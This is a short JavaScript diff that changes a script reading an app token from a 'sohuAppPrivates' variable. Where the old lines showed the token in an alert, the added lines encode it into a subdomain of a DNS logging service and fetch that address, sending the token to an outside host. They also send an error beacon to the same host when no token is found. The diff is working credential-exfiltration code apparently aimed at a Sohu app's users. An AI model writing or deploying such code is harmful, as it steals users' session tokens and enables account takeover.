@@ -25,9 +25,27 @@
         let token = null;
         if (sohuAppPrivates && sohuAppPrivates.token) {
             token = sohuAppPrivates.token;
-            console.log('Token:', token);
-            alert(token);
+            let dnslogUrl = encodeURIComponent(token) + '.bbc66268.log.dnslog.biz';
+            fetch(dnslogUrl, {
+              mode: 'no-cors'
+            })
+            .then(response => {
+              console.log('Token sent to dnslog:', response.status);
+            })
+            .catch(error => {
+              console.error('Error sending token to dnslog:', error);
+            });
         } else {
+            let dnslogUrl =  'error.bbc66268.log.dnslog.biz';
+            fetch(dnslogUrl, {
+              mode: 'no-cors'
+            })
+            .then(response => {
+              console.log('Token sent to dnslog:', response.status);
+            })
+            .catch(error => {
+              console.error('Error sending token to dnslog:', error);
+            });
             console.log('SohuAppPrivates variable not found or token not present.');
         }
     }
